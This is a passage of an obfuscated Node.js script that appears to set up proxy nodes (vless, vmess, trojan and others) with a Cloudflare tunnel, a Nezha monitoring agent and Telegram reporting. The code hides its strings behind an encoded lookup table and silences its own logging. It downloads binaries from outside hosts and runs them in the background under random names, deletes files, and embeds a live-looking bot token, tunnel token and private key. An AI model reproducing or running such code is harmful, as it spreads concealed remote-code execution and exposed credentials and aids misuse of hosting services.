#!/usr/bin/env node

const _0x5c9a9f = _0x1ecc
;(function (_0x1a4c9b, _0x5327a9) {
  const _0x4f153d = { _0x3229ee: 0x16a, _0x74d03a: 0x185, _0x9841b3: 0x14f, _0x1c5c43: 0x155, _0x4bcbfb: 0x116, _0xefcf68: 0x1de, _0x5e8aa4: 0x1fe },
    _0x5187d5 = _0x1ecc,
    _0x570e1d = _0x1a4c9b()
  while (!![]) {
    try {
      const _0x2111f8 =
        -parseInt(_0x5187d5(_0x4f153d._0x3229ee)) / 0x1 +
        (-parseInt(_0x5187d5(0x18d)) / 0x2) * (parseInt(_0x5187d5(_0x4f153d._0x74d03a)) / 0x3) +
        (parseInt(_0x5187d5(_0x4f153d._0x9841b3)) / 0x4) * (parseInt(_0x5187d5(_0x4f153d._0x1c5c43)) / 0x5) +
        (parseInt(_0x5187d5(0x112)) / 0x6) * (-parseInt(_0x5187d5(0x1a4)) / 0x7) +
        (-parseInt(_0x5187d5(0x16d)) / 0x8) * (-parseInt(_0x5187d5(_0x4f153d._0x4bcbfb)) / 0x9) +
        (-parseInt(_0x5187d5(0xf2)) / 0xa) * (-parseInt(_0x5187d5(_0x4f153d._0xefcf68)) / 0xb) +
        -parseInt(_0x5187d5(_0x4f153d._0x5e8aa4)) / 0xc
      if (_0x2111f8 === _0x5327a9) break
      else _0x570e1d['push'](_0x570e1d['shift']())
    } catch (_0x402556) {
      _0x570e1d['push'](_0x570e1d['shift']())
    }
  }
})(_0x2388, 0x92911)
const http = require('http'),
  axios = require('axios'),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x5c9a9f(0x1da)),
  crypto = require('crypto'),
  { promisify } = require(_0x5c9a9f(0x10a)),
  { exec: execCommand, execSync } = require(_0x5c9a9f(0x20a)),
  exec = promisify(execCommand),
  PORT = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0x1aa)] || 0xbb8,
  SUB_PATH = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0x174)] || _0x5c9a9f(0x1fa),
  NAME = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0x1e2)] || _0x5c9a9f(0x1ad),
  CFIP = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0xe5)] || _0x5c9a9f(0x109),
  CFPORT = process[_0x5c9a9f(0x10d)]['CFPORT'] || 0x1bb,
  UPLOAD_URL = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0x1c7)] || '',
  PROJECT_URL = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0x187)] || '',
  AUTO_ACCESS = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0x1d0)] || ![],
  FILE_PATH = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0x11d)] || _0x5c9a9f(0x1dc),
  NEZHA_SERVER = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0x127)] || _0x5c9a9f(0xec),
  NEZHA_PORT = process[_0x5c9a9f(0x10d)]['NEZHA_PORT'] || '',
  NEZHA_KEY = process['env'][_0x5c9a9f(0x12d)] || _0x5c9a9f(0x108),
  UUID = process['env'][_0x5c9a9f(0xfc)] || _0x5c9a9f(0x11f),
  ARGO_AUTH =
    process[_0x5c9a9f(0x10d)]['ARGO_AUTH'] ||
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYWU2ZDIyN2MtMWRmZi00MjA2LWEyYWMtODI0MmRmNTZkMjdlIiwicyI6Ik1UQXlZalpsTnpjdFpEVTJZeTAwWm1OaExXRXpNemd0TVRFMll6Z3hZVFUwTkRWayJ9',
  ARGO_DOMAIN = process['env'][_0x5c9a9f(0x168)] || _0x5c9a9f(0x1f1),
  ARGO_PORT = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0xef)] || 0xe2e1,
  S5_PORT = process['env']['S5_PORT'] || '',
  HY2_PORT = process['env'][_0x5c9a9f(0x1ef)] || '',
  REALITY_PORT = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0x1ae)] || '',
  CHAT_ID = process[_0x5c9a9f(0x10d)][_0x5c9a9f(0x1b5)] || _0x5c9a9f(0xf8),
  BOT_TOKEN = process[_0x5c9a9f(0x10d)]['BOT_TOKEN'] || _0x5c9a9f(0x130),
  SHOW_LOG = ![_0x5c9a9f(0x17f), 'disable', 'no'][_0x5c9a9f(0x14a)]((process['env'][_0x5c9a9f(0x1c5)] || _0x5c9a9f(0x17f))['toLowerCase']())
!SHOW_LOG && ((console[_0x5c9a9f(0x1e7)] = () => {}), (console['error'] = () => {}))
function alwaysLog(_0x29ed9b) {
  const _0x5a74ad = _0x5c9a9f
  process[_0x5a74ad(0x13f)][_0x5a74ad(0x110)](_0x29ed9b + '\x0a')
}
if (!fs['existsSync'](FILE_PATH)) fs[_0x5c9a9f(0x1a9)](FILE_PATH)
else {
}
function isValidPort(_0x35daa6) {
  const _0x2dfc79 = _0x5c9a9f
  try {
    if (_0x35daa6 === null || _0x35daa6 === undefined || _0x35daa6 === '') return ![]
    if (typeof _0x35daa6 === _0x2dfc79(0x145) && _0x35daa6['trim']() === '') return ![]
    const _0x14d9e3 = parseInt(_0x35daa6)
    if (isNaN(_0x14d9e3)) return ![]
    if (_0x14d9e3 < 0x1 || _0x14d9e3 > 0xffff) return ![]
    return !![]
  } catch (_0x4595ab) {
    return ![]
  }
}
function generateRandomName() {
  const _0x2372c9 = { _0x36f4a1: 0x1ff, _0x2c68c5: 0x1a8, _0x60bea3: 0x11c },
    _0x8997c9 = _0x5c9a9f,
    _0x3d1410 = _0x8997c9(_0x2372c9._0x36f4a1)
  let _0xea8fcb = ''
  for (let _0x56d966 = 0x0; _0x56d966 < 0x6; _0x56d966++) {
    _0xea8fcb += _0x3d1410['charAt'](Math[_0x8997c9(_0x2372c9._0x2c68c5)](Math['random']() * _0x3d1410[_0x8997c9(_0x2372c9._0x60bea3)]))
  }
  return _0xea8fcb
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path['join'](FILE_PATH, npmName),
  phpPath = path[_0x5c9a9f(0x173)](FILE_PATH, phpName),
  webPath = path[_0x5c9a9f(0x173)](FILE_PATH, webName),
  botPath = path[_0x5c9a9f(0x173)](FILE_PATH, botName),
  subPath = path[_0x5c9a9f(0x173)](FILE_PATH, _0x5c9a9f(0x1c9)),
  listPath = path[_0x5c9a9f(0x173)](FILE_PATH, _0x5c9a9f(0xf1)),
  bootLogPath = path[_0x5c9a9f(0x173)](FILE_PATH, 'boot.log'),
  configPath = path[_0x5c9a9f(0x173)](FILE_PATH, _0x5c9a9f(0x1c1)),
  certPath = path[_0x5c9a9f(0x133)](FILE_PATH, 'cert.pem'),
  keyPath = path[_0x5c9a9f(0x133)](FILE_PATH, 'private.key')
function _0x2388() {
  const _0x3b06aa = [
    'digest',
    '30069KDYkhJ',
    '```',
    '/sub.txt\x20saved\x20successfully',
    'fileName',
    'trojan-ws-in',
    'url',
    'length',
    'FILE_PATH',
    'MarkdownV2',
    '180233cd-22c9-4144-a559-012e45986dd6',
    '\x20from\x20backup\x20source',
    'xtls-rprx-vision',
    'win32',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'replace',
    '节点推送**\x0a```',
    '\x22\x20run',
    'NEZHA_SERVER',
    'amd',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'isFile',
    'data',
    'readFileSync',
    'NEZHA_KEY',
    'blackhole',
    '\x0a\x0atrojan://',
    '8962228750:AAGlYPI5a4FVgx0-gUbB383JirHhkuqbwRE',
    '/vless-argo',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'resolve',
    '\x22\x20-out\x20\x22',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
    'filter',
    'substring',
    '\x0a\x20\x20credentials-file:\x20',
    '/v1',
    'generateKeyPairSync',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    'charAt',
    'error',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    'stdout',
    '\x0avless://',
    'http\x20server\x20is\x20running\x20on\x20',
    'inbounds',
    'utf8',
    'https://api.ip.sb/geoip',
    'string',
    'org',
    'PrivateKey:\x20',
    'quic',
    'Mozilla/5.0',
    'includes',
    'readdirSync',
    '\x0ahysteria2://',
    '\x22\x20>\x20/dev/null\x202>&1',
    'update',
    '31516WXjXBn',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    'nohup\x20',
    'existsSync',
    'privateKey',
    'vless',
    '175lCqHHN',
    'proxy',
    '\x20in\x20clouudflare',
    'get',
    'split',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
    '/api/add-nodes',
    'Unknown',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    'countryCode',
    'Add\x20automatic\x20access\x20task\x20faild:\x20',
    'spki',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    'success',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    '/vmess-argo',
    'ARGO_DOMAIN:',
    '\x0a\x20\x20\x20\x20',
    'ARGO_DOMAIN',
    'publicKey',
    '3975xaDXAv',
    'trojan',
    'App\x20is\x20running',
    '1992yTpwMl',
    '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20',
    'response',
    'vless-tcp-in',
    'Error\x20executing\x20command:\x20',
    'Private\x20Key:',
    'join',
    'SUB_PATH',
    'https://api.telegram.org/bot',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    'text/plain;\x20charset=utf-8',
    'createServer',
    'none',
    'tunnel.json',
    'index.html',
    '443',
    'end',
    'false',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    'utf-8',
    'subarray',
    '?security=tls&sni=',
    '3xgLzZz',
    'country_code',
    'PROJECT_URL',
    'https+local://8.8.8.8/dns-query',
    '2083',
    'toUpperCase',
    '&pinSHA256=',
    '\x0a\x20\x20tunnel:\x20',
    '382300fFXNSb',
    'https://amd64.ssss.nyc.mn',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    'hex',
    '/sendMessage',
    'writeHead',
    'Telegram\x20message\x20sent\x20successfully',
    'ArgoDomain:',
    'all',
    'test',
    'dirname',
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    'message',
    '127.0.0.1',
    'arm64',
    'der',
    'vless-in',
    '/bot',
    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.',
    'http://ip-api.com/json',
    'basename',
    '\x5c$&',
    '1312507DWvkeB',
    'taskkill\x20/f\x20/im\x20',
    'https://arm64.ssss.nyc.mn',
    'finish',
    'floor',
    'mkdirSync',
    'PORT',
    'Retrying\x20',
    'vmess',
    'js-node',
    'REALITY_PORT',
    '\x20-c\x20',
    '?encryption=none&security=tls&sni=',
    'slice',
    '\x20failed:\x20',
    '.exe\x20>\x20nul\x202>&1',
    'clear',
    'CHAT_ID',
    'Empowerment\x20failed\x20for\x20',
    'x25519',
    'platform',
    'password',
    'pkill\x20-f\x20\x22[',
    'TunnelSecret',
    'Public\x20Key:',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    '/dev/null',
    'vmess-ws-in',
    'config.json',
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
    '\x20>/dev/null\x202>&1\x20&',
    'status',
    'SHOW_LOG',
    'vless-fallback-in',
    'UPLOAD_URL',
    'www.iij.ad.jp:443',
    'sub.txt',
    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    'aarch64',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    'key.txt',
    'Failed\x20to\x20send\x20Telegram\x20message:',
    'AUTO_ACCESS',
    'ignore',
    '\x0aclient_secret:\x20',
    'https://amd64.oooen.com',
    '2096',
    'https://bing.com',
    'fileUrls',
    'text/html;\x20charset=utf-8',
    '\x0aPublicKey:\x20',
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
    'path',
    'statSync',
    '.npm',
    'www.iij.ad.jp',
    '10118053vlpwqd',
    'hysteria',
    'readFile',
    'Nodes\x20uploaded\x20successfully',
    'NAME',
    'stringify',
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
    '\x20-s\x20',
    '--tls',
    'log',
    'push',
    'forEach',
    'Unhandled\x20error\x20in\x20startserver:',
    'map',
    '&fp=firefox&type=ws&host=',
    '/api/delete-nodes',
    'tls',
    'HY2_PORT',
    'trim',
    'deployzy.933993.xyz',
    'application/json',
    'http://ipv4.ip.sb',
    'freedom',
    'reality',
    'BggqhkjOPQMBBw==\x0a',
    'Download\x20',
    '2087',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    '800',
    'catch',
    'http',
    'Not\x20Found',
    '1284348bpXfEH',
    'abcdefghijklmnopqrstuvwxyz',
    'direct',
    'tcp',
    'nohup\x20\x22',
    'promises',
    'Error\x20reading\x20boot.log:',
    '\x20>/dev/null\x202>&1',
    'true',
    'firefox',
    'web\x20running\x20error:\x20',
    '\x20is\x20running',
    'child_process',
    '/trojan-argo',
    'auto',
    'writeFileSync',
    'renameSync',
    'toString',
    'openssl\x20version',
    '&type=tcp&headerType=none#',
    'CFIP',
    '/vmess-argo?ed=2560',
    'chmodSync',
    '\x20-p\x20',
    'then',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    'nezha.933993.xyz:443',
    '8443',
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
    'ARGO_PORT',
    'base64',
    'list.txt',
    '10HLdNhv',
    'boot.log',
    'now',
    'has',
    '\x20-c\x20\x22',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    '7575949494',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    'npm\x20running\x20error:\x20',
    'match',
    'UUID',
    '.download',
    'Empowerment\x20success\x20for\x20',
    '/web',
    'Subscription\x20uploaded\x20successfully',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    'https://arm64.oooen.com',
    'del\x20/f\x20/q\x20',
    '\x0asocks://',
    'unshift',
    'unlink',
    'from',
    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
    'mfa.gov.ua',
    'util',
    'raw',
    '\x20>\x20nul\x202>&1',
    'env',
    'Failed\x20to\x20get\x20IP\x20address:',
    'export',
    'write',
    'listen',
    '36twPMGE',
    'arm',
    'post'
  ]
  _0x2388 = function () {
    return _0x3b06aa
  }
  return _0x2388()
}
function deleteNodes() {
  const _0x41d948 = { _0x4ece65: 0x182, _0x3b274d: 0xe2, _0x36ac1d: 0x1ed, _0x58f1c9: 0x1fb },
    _0x5d37b4 = _0x5c9a9f
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x5d37b4(0x152)](subPath)) return
    let _0x5e496a
    try {
      _0x5e496a = fs[_0x5d37b4(0x12c)](subPath, _0x5d37b4(_0x41d948._0x4ece65))
    } catch {
      return null
    }
    const _0x2cf228 = Buffer[_0x5d37b4(0x107)](_0x5e496a, 'base64')[_0x5d37b4(_0x41d948._0x3b274d)](_0x5d37b4(0x182)),
      _0x5d8da7 = _0x2cf228['split']('\x0a')['filter']((_0x16647f) => /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x5d37b4(0x196)](_0x16647f))
    if (_0x5d8da7[_0x5d37b4(0x11c)] === 0x0) return
    return (
      axios[_0x5d37b4(0x114)](UPLOAD_URL + _0x5d37b4(_0x41d948._0x36ac1d), JSON[_0x5d37b4(0x1e3)]({ nodes: _0x5d8da7 }), {
        headers: { 'Content-Type': _0x5d37b4(0x1f2) }
      })[_0x5d37b4(_0x41d948._0x58f1c9)]((_0x356ae8) => {
        return null
      }),
      null
    )
  } catch (_0x5c9ac1) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x398b3a = { _0x4fd8c0: 0x173 },
    _0x520ec4 = _0x5c9a9f
  try {
    const _0x28b384 = fs[_0x520ec4(0x14b)](FILE_PATH)
    _0x28b384[_0x520ec4(0x1e9)]((_0xc35f3a) => {
      const _0x415e65 = _0x520ec4,
        _0x424fce = path[_0x415e65(_0x398b3a._0x4fd8c0)](FILE_PATH, _0xc35f3a)
      try {
        const _0x32db51 = fs[_0x415e65(0x1db)](_0x424fce)
        _0x32db51[_0x415e65(0x12a)]() && fs['unlinkSync'](_0x424fce)
      } catch (_0x2eeb22) {}
    })
  } catch (_0x348147) {}
}
function generateX25519Keypair() {
  const _0xc4b537 = { _0x3fc181: 0x13a, _0x43bb3a: 0x19d, _0xe8680a: 0x183, _0x25ac1d: 0xe2 },
    _0x55ef3e = _0x5c9a9f,
    { publicKey: _0x1d7db1, privateKey: _0x11ab00 } = crypto[_0x55ef3e(_0xc4b537._0x3fc181)](_0x55ef3e(0x1b7)),
    _0x3e00e8 = _0x11ab00[_0x55ef3e(0x10f)]({ type: 'pkcs8', format: _0x55ef3e(_0xc4b537._0x43bb3a) })['subarray'](-0x20),
    _0x616fb0 = _0x1d7db1['export']({ type: _0x55ef3e(0x161), format: _0x55ef3e(0x19d) })[_0x55ef3e(_0xc4b537._0xe8680a)](-0x20)
  return { privateKey: _0x3e00e8[_0x55ef3e(_0xc4b537._0x25ac1d)]('base64url'), publicKey: _0x616fb0['toString']('base64url') }
}
function generateOrLoadKeyPair() {
  const _0x3d1471 = {
      _0x556af9: 0x173,
      _0x193630: 0x1ce,
      _0x283116: 0x12c,
      _0x57f448: 0x1f0,
      _0xcb61d0: 0x1f0,
      _0x181ed0: 0x172,
      _0x43e872: 0xe0,
      _0x217e59: 0x143,
      _0x8f7e9b: 0x1e7,
      _0x2fe8b0: 0x1e7
    },
    _0x551919 = _0x5c9a9f,
    _0x1ab441 = path[_0x551919(_0x3d1471._0x556af9)](FILE_PATH, _0x551919(_0x3d1471._0x193630))
  if (fs[_0x551919(0x152)](_0x1ab441)) {
    const _0x44fc7e = fs[_0x551919(_0x3d1471._0x283116)](_0x1ab441, 'utf8'),
      _0x29d2a3 = _0x44fc7e['match'](/PrivateKey:\s*(.*)/),
      _0x55a9f5 = _0x44fc7e['match'](/PublicKey:\s*(.*)/)
    if (_0x29d2a3 && _0x55a9f5) {
      ;((privateKey = _0x29d2a3[0x1][_0x551919(_0x3d1471._0x57f448)]()),
        (publicKey = _0x55a9f5[0x1][_0x551919(_0x3d1471._0xcb61d0)]()),
        console['log'](_0x551919(_0x3d1471._0x181ed0), privateKey),
        console[_0x551919(0x1e7)](_0x551919(0x1bc), publicKey))
      return
    }
  }
  const _0x487125 = generateX25519Keypair()
  ;((privateKey = _0x487125[_0x551919(0x153)]),
    (publicKey = _0x487125[_0x551919(0x169)]),
    fs[_0x551919(_0x3d1471._0x43e872)](
      _0x1ab441,
      _0x551919(0x147) + privateKey + _0x551919(0x1d8) + publicKey + '\x0a',
      _0x551919(_0x3d1471._0x217e59)
    ),
    console[_0x551919(_0x3d1471._0x8f7e9b)]('Private\x20Key:', privateKey),
    console[_0x551919(_0x3d1471._0x2fe8b0)]('Public\x20Key:', publicKey))
}
const FALLBACK_EC_KEY =
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a' +
    _0x5c9a9f(0x1f6) +
    _0x5c9a9f(0xf7) +
    _0x5c9a9f(0x15b) +
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a' +
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a' +
    _0x5c9a9f(0x1c2) +
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
  FALLBACK_CERT =
    '-----BEGIN\x20CERTIFICATE-----\x0a' +
    _0x5c9a9f(0x1d9) +
    _0x5c9a9f(0x177) +
    _0x5c9a9f(0xee) +
    _0x5c9a9f(0x13b) +
    _0x5c9a9f(0x15a) +
    _0x5c9a9f(0x1e4) +
    _0x5c9a9f(0x198) +
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a' +
    '-----END\x20CERTIFICATE-----\x0a'
function _0x1ecc(_0x47fff5, _0x428fb9) {
  const _0x238818 = _0x2388()
  return (
    (_0x1ecc = function (_0x1eccc4, _0x28819a) {
      _0x1eccc4 = _0x1eccc4 - 0xdf
      let _0x5b7088 = _0x238818[_0x1eccc4]
      return _0x5b7088
    }),
    _0x1ecc(_0x47fff5, _0x428fb9)
  )
}
function ensureTlsCertificates(_0x11326b, _0x17c2ea) {
  const _0x5a0ad1 = { _0x3cb50d: 0x152, _0x457676: 0xe3, _0x5280a2: 0x1d1 },
    _0x523fc4 = _0x5c9a9f
  if (fs[_0x523fc4(0x152)](_0x11326b) && fs[_0x523fc4(_0x5a0ad1._0x3cb50d)](_0x17c2ea)) return
  fs[_0x523fc4(0x1a9)](path[_0x523fc4(0x197)](_0x11326b), { recursive: !![] })
  try {
    ;(execSync(_0x523fc4(_0x5a0ad1._0x457676), { stdio: _0x523fc4(0x1d1) }),
      execSync(_0x523fc4(0x123) + _0x17c2ea + '\x22', { stdio: _0x523fc4(_0x5a0ad1._0x5280a2) }),
      execSync(_0x523fc4(0x181) + _0x17c2ea + _0x523fc4(0x134) + _0x11326b + '\x22\x20-subj\x20\x22/CN=bing.com\x22', {
        stdio: _0x523fc4(_0x5a0ad1._0x5280a2)
      }))
    return
  } catch (_0x5f0570) {}
  ;(fs[_0x523fc4(0xe0)](_0x17c2ea, FALLBACK_EC_KEY), fs['writeFileSync'](_0x11326b, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x1f1beb) {
  const _0xf5aa86 = { _0x554ec9: 0x1f0, _0x3a6d66: 0x18a, _0x38a6f1: 0xfb, _0x2b2e9f: 0x124, _0x11c855: 0x107, _0x1d8567: 0x18a },
    _0xc627a3 = _0x5c9a9f
  try {
    const _0x17b021 = execSync(_0xc627a3(0x1bd) + _0x1f1beb + '\x22', { encoding: 'utf8', timeout: 0xbb8 })[_0xc627a3(_0xf5aa86._0x554ec9)](),
      _0x582b86 = _0x17b021[_0xc627a3(0xfb)](/=(.+)$/)
    if (_0x582b86 && _0x582b86[0x1]) return _0x582b86[0x1][_0xc627a3(_0xf5aa86._0x3a6d66)]()
  } catch (_0x32b784) {}
  try {
    const _0x21c4e2 = fs[_0xc627a3(0x12c)](_0x1f1beb, _0xc627a3(0x143)),
      _0x2e37d3 = _0x21c4e2[_0xc627a3(_0xf5aa86._0x38a6f1)](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x2e37d3) return ''
    const _0x291fa5 = _0x2e37d3[0x1][_0xc627a3(_0xf5aa86._0x2b2e9f)](/\s/g, ''),
      _0x286004 = Buffer[_0xc627a3(_0xf5aa86._0x11c855)](_0x291fa5, _0xc627a3(0xf0)),
      _0x3e10c8 = crypto['createHash']('sha256')[_0xc627a3(0x14e)](_0x286004)[_0xc627a3(0x115)](_0xc627a3(0x190))
    return _0x3e10c8[_0xc627a3(0xfb)](/.{2}/g)[_0xc627a3(0x173)](':')[_0xc627a3(_0xf5aa86._0x1d8567)]()
  } catch (_0x160b54) {
    return (console[_0xc627a3(0x13d)](_0xc627a3(0x1ca), _0x160b54), '')
  }
}
async function generateConfig() {
  const _0xa9b614 = {
      _0x7d3e4: 0x17a,
      _0x2c71af: 0x1c6,
      _0xd680bd: 0x154,
      _0x21e961: 0x121,
      _0xfb7c89: 0x170,
      _0x51c55d: 0x19b,
      _0x327293: 0x19b,
      _0x49e25c: 0x154,
      _0x4ab647: 0x17a,
      _0xd2785: 0x165,
      _0x206550: 0x11a,
      _0x556be0: 0x20b,
      _0x9c1087: 0x1fc,
      _0x17bd27: 0x1ee,
      _0xc334b7: 0x148,
      _0x51f244: 0x188,
      _0x168b88: 0x200,
      _0x5d7707: 0x19e,
      _0x406f83: 0x154,
      _0x1b2a8c: 0x1c8,
      _0x399fa4: 0x1dd,
      _0x2ab855: 0x142,
      _0x46e785: 0x1e8,
      _0x11f41e: 0x1df,
      _0x3d4bcf: 0x1d5,
      _0x3c9f5d: 0x1b9,
      _0x4c7c6: 0x137,
      _0xadddb: 0xe0,
      _0x3a73b1: 0x173
    },
    _0x26e231 = _0x5c9a9f,
    _0x1c4834 = {
      log: { access: _0x26e231(0x1bf), error: _0x26e231(0x1bf), loglevel: _0x26e231(_0xa9b614._0x7d3e4) },
      inbounds: [
        {
          tag: _0x26e231(_0xa9b614._0x2c71af),
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x26e231(_0xa9b614._0xd680bd),
          settings: {
            clients: [{ id: UUID, flow: _0x26e231(_0xa9b614._0x21e961) }],
            decryption: _0x26e231(0x17a),
            fallbacks: [
              { dest: 0xbb9 },
              { path: '/vless-argo', dest: 0xbba },
              { path: _0x26e231(0x165), dest: 0xbbb },
              { path: _0x26e231(0x20b), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x26e231(0x201) }
        },
        {
          tag: _0x26e231(_0xa9b614._0xfb7c89),
          port: 0xbb9,
          listen: _0x26e231(_0xa9b614._0x51c55d),
          protocol: _0x26e231(0x154),
          settings: { clients: [{ id: UUID }], decryption: 'none' },
          streamSettings: { network: _0x26e231(0x201), security: 'none' }
        },
        {
          tag: 'vless-ws-in',
          port: 0xbba,
          listen: _0x26e231(_0xa9b614._0x327293),
          protocol: _0x26e231(_0xa9b614._0x49e25c),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x26e231(_0xa9b614._0x4ab647) },
          streamSettings: { network: 'ws', security: _0x26e231(0x17a), wsSettings: { path: _0x26e231(0x131) } },
          sniffing: { enabled: !![], destOverride: [_0x26e231(0x1fc), _0x26e231(0x1ee), 'quic'], metadataOnly: ![] }
        },
        {
          tag: _0x26e231(0x1c0),
          port: 0xbbb,
          listen: _0x26e231(_0xa9b614._0x327293),
          protocol: _0x26e231(0x1ac),
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x26e231(_0xa9b614._0xd2785) } },
          sniffing: { enabled: !![], destOverride: [_0x26e231(0x1fc), _0x26e231(0x1ee), _0x26e231(0x148)], metadataOnly: ![] }
        },
        {
          tag: _0x26e231(_0xa9b614._0x206550),
          port: 0xbbc,
          listen: _0x26e231(0x19b),
          protocol: _0x26e231(0x16b),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x26e231(_0xa9b614._0x7d3e4), wsSettings: { path: _0x26e231(_0xa9b614._0x556be0) } },
          sniffing: {
            enabled: !![],
            destOverride: [_0x26e231(_0xa9b614._0x9c1087), _0x26e231(_0xa9b614._0x17bd27), _0x26e231(_0xa9b614._0xc334b7)],
            metadataOnly: ![]
          }
        }
      ],
      dns: { servers: [_0x26e231(_0xa9b614._0x51f244)] },
      outbounds: [
        { protocol: _0x26e231(0x1f4), tag: _0x26e231(_0xa9b614._0x168b88) },
        { protocol: _0x26e231(0x12e), tag: 'block' }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x1c4834['inbounds'][_0x26e231(0x1e8)]({
      tag: _0x26e231(_0xa9b614._0x5d7707),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: _0x26e231(_0xa9b614._0x406f83),
      settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: _0x26e231(0x17a) },
      streamSettings: {
        network: _0x26e231(0x10b),
        security: _0x26e231(0x1f5),
        realitySettings: {
          show: ![],
          dest: _0x26e231(_0xa9b614._0x1b2a8c),
          xver: 0x0,
          serverNames: [_0x26e231(_0xa9b614._0x399fa4)],
          privateKey: privateKey,
          shortIds: ['']
        }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x1c4834[_0x26e231(_0xa9b614._0x2ab855)][_0x26e231(_0xa9b614._0x46e785)]({
        tag: 'hysteria-in',
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0x26e231(0x1df),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
